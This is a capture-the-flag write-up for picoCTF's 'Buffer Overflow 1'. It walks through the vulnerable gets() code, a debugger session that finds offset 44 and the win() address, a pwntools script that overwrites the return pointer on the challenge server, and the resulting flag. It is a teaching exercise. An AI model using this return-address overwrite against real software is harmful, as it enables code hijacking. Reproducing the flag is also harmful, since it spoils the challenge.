# Buffer Overflow 1

## Overview:

Category: Binary Exploitation
Points: 200

## Description

Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source [here](./vuln.c). And connect with it using `nc saturn.picoctf.net 49618`

## Hints

1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Approach

Lets look at the code:

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

So we notice here that there is a dangerous `gets(buf);` function. Automatically we should be able to determine that we can overflow the buffer here. Now its just a matter of finding out the padding and what we want to change our return instruction pointer address to. And we know that the `win()` function will go ahead and output that flag for us.


## Attack

So we need to figure out a few things before we launch our attack.

1. The offset for our overflow.
2. The address of the win() function.

Launching pwngdb we can easily find the address of the win function:

```text
pwndbg> disassemble win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   ebp
   0x080491fb <+5>:     mov    ebp,esp
   0x080491fd <+7>:     push   ebx
   0x080491fe <+8>:     sub    esp,0x54
   0x08049201 <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049206 <+16>:    add    ebx,0x2dfa
   0x0804920c <+22>:    sub    esp,0x8
   0x0804920f <+25>:    lea    eax,[ebx-0x1ff8]
   0x08049215 <+31>:    push   eax
   0x08049216 <+32>:    lea    eax,[ebx-0x1ff6]
   0x0804921c <+38>:    push   eax
   0x0804921d <+39>:    call   0x80490c0 <fopen@plt>
   0x08049222 <+44>:    add    esp,0x10
   0x08049225 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x08049228 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x0804922c <+54>:    jne    0x8049258 <win+98>
   0x0804922e <+56>:    sub    esp,0x4
   0x08049231 <+59>:    lea    eax,[ebx-0x1fed]
   0x08049237 <+65>:    push   eax
   0x08049238 <+66>:    lea    eax,[ebx-0x1fd8]
   0x0804923e <+72>:    push   eax
   0x0804923f <+73>:    lea    eax,[ebx-0x1fa3]
   0x08049245 <+79>:    push   eax
   0x08049246 <+80>:    call   0x8049040 <printf@plt>
   0x0804924b <+85>:    add    esp,0x10
   0x0804924e <+88>:    sub    esp,0xc
   0x08049251 <+91>:    push   0x0
   0x08049253 <+93>:    call   0x8049090 <exit@plt>
   0x08049258 <+98>:    sub    esp,0x4
   0x0804925b <+101>:   push   DWORD PTR [ebp-0xc]
   0x0804925e <+104>:   push   0x40
   0x08049260 <+106>:   lea    eax,[ebp-0x4c]
   0x08049263 <+109>:   push   eax
   0x08049264 <+110>:   call   0x8049060 <fgets@plt>
   0x08049269 <+115>:   add    esp,0x10
   0x0804926c <+118>:   sub    esp,0xc
   0x0804926f <+121>:   lea    eax,[ebp-0x4c]
   0x08049272 <+124>:   push   eax
   0x08049273 <+125>:   call   0x8049040 <printf@plt>
   0x08049278 <+130>:   add    esp,0x10
   0x0804927b <+133>:   nop
   0x0804927c <+134>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804927f <+137>:   leave
   0x08049280 <+138>:   ret
End of assembler dump.
pwndbg>
```

We can see here that the first address (AKA, the address of the function) is here at `0x080491f6`.
Now to find the offset. 

```text
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*EAX  0x41
*EBX  0x6161616a ('jaaa')
*ECX  0xffffce1c ◂— 0x13bc2000
*EDX  0x1
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 (__libc_csu_init) ◂— endbr32 
*EBP  0x6161616b ('kaaa')
*ESP  0xffffcea0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x6161616c ('laaa')
```

Using `cyclic 100` as our input, we can identify where we need to overwrite to using the letters that are stored in the EIP.

```text
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

Now knowing the address we need to reach and the padding required, we can write a solve script:

```c
from pwn import *

conn = remote("saturn.picoctf.net", 49618)
<!-- padding required to overwrite return pointer -->
overflow_num = 44
<!-- address of win() -->
win = 0x080491f6

payload = b'A' * overflow_num 
payload += (p32(win))

conn.sendlineafter(b'Please enter your string: ' ,payload)
print("flag:",conn.recvall().split(b"\n")[-1].decode())
```

Note: p32 is essentially correcting the input of the address into little endian. for example: "\xf6\x91\x04\x08"


```text
$ python solve.py
    [+] Opening connection to saturn.picoctf.net on port 49618: Done
    [+] Receiving all data: Done (101B)
    [*] Closed connection to saturn.picoctf.net port 49618
    flag: picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```

## Flag

picoCTF{addr3ss3s_ar3_3asy_b15b081e}